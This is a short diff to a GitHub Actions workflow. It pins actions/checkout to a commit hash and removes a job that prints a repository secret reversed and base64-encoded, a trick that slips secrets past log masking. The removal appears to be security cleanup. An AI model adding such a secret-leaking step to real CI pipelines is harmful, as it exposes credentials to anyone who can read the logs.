@@ -14,10 +14,4 @@ jobs:
 
     steps:
       - name: Checkout code
-        uses: actions/checkout@v3
-  check_permissions:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Check GITHUB_TOKEN permissions
-        run: |
-          echo ${{ secrets.TEST_SECRET }} | rev | base64
+      - uses: actions/checkout@c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e
